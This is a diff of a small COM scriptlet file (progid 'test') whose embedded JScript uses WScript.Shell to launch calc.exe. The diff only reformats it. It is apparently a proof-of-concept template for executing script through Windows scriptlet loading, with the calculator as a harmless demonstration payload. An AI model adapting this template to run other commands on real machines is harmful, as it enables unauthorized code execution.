@@ -5,15 +5,14 @@
   description="test"
   progid="test"
   version="1.00"
-  remotable="true"
-  >
-</registration>
+  remotable="true" >
 
-<script language="JScript">
+	<script language="JScript">
 
-<![CDATA[
-  var a = new ActiveXObject("WScript.Shell").Run("calc.exe")
-]]>
+	<![CDATA[
+	  new ActiveXObject("WScript.Shell").Run("calc.exe");
+	]]>
 
 </script>
+</registration>
 </scriptlet>
